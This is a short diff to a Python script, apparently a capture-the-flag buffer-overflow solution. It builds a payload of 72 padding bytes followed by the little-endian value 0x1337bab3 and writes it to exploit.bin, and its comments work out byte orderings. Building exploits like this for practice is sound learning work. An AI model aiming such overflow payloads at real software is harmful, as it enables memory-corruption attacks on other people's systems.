@@ -10,12 +10,12 @@ PORT = 1234
 
 #PRINTF 0x0000 55 55 55 55 52 94 = \x94\x52\x55\x55\x55\x55
 #PRINTF 0x55 55 55 55 60 55 = \x55\x60\x55\x55\x55\x55
+#PRINTF 0x 13 37 ba b3 = \xb3\xba\x37\x13
 
 
-
-offset = b"A" * 72
+offset = b"A"*72
 #ebpfalg = b"\xb3\xba\x37\x13"
-ebpflag = b"\x55\x60\x55\x55\x55\x55"
+ebpflag = b"\xb3\xba\x37\x13"
 exploit = offset + ebpflag
 f = open("exploit.bin", "wb")
 f.write(exploit)
